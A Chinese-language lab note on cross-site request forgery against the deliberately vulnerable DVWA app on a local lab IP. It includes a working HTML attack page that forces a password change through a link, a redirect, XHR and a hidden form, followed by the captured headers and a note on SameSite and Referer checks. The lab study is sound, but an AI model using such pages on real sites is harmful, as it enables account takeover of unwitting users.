# CSRF 跨站请求伪造

### 中级

查看当前cookie的 策略

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

#### cookie的跨域表现

```html
// html
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <a href="http://192.168.120.134/DVWA/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change">砍一刀</a>
    <button onclick="locat()">通过跳转</button>
    <button onclick="ajax()">通过ajax</button>
    <form action="http://192.168.120.134/DVWA/vulnerabilities/csrf/?" method="get">  
        <!-- 新密码参数 -->
        <input type="hidden" name="password_new" value="admin">
        <!-- 确认密码参数（需与新密码一致） -->
        <input type="hidden" name="password_conf" value="admin">
        <!-- 提交标识（固定值 "Change"） -->
        <input type="hidden" name="Change" value="Change">
        <button type="submit">form表单</form></button>
    </form>
    <script>
        const url= "http://192.168.120.134/DVWA/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change"
       function locat()
        {
            window.location.href=url;
        }

       function ajax()
        {
            const xhr = new XMLHttpRequest();
            xhr.open("GET",url,true);
            xhr.send();
        }
        
    </script>
</body>
</html>
```

{% code title="a标签跳转" lineNumbers="true" %}
```http
// http
Host: 192.168.120.134
Referer: http://127.0.0.1:8090/
Cookie: PHPSESSID=7cqvgsrpu0pgkfar8qccnospcu; security=medium
```
{% endcode %}

{% code title="window.location" lineNumbers="true" %}
```http
// Some code
Host: 192.168.120.134
Referer: http://127.0.0.1:8090/
Cookie: PHPSESSID=7cqvgsrpu0pgkfar8qccnospcu; security=medium
```
{% endcode %}

{% code title="ajax请求" lineNumbers="true" %}
```http
// http
Host: 192.168.120.134
Origin: http://127.0.0.1:8090
Referer: http://127.0.0.1:8090/
```
{% endcode %}

{% code title="form表单提交" lineNumbers="true" %}
```http
// http
Host: 192.168.120.134
Referer: http://127.0.0.1:8090/
Cookie: PHPSESSID=7cqvgsrpu0pgkfar8qccnospcu; security=medium
```
{% endcode %}

{% hint style="info" %}
可以看出,在cookie 没有设置 `samesite` 的规则下(默认为`lax` )&#x20;

ajax 请求没有携带cookie&#x20;
{% endhint %}

但是这个题目,既验证`cookie`, 又验证`Referer`  ,除非有一下的漏洞:

* 依赖xss
* 使用自己的域名,构建一个子域名
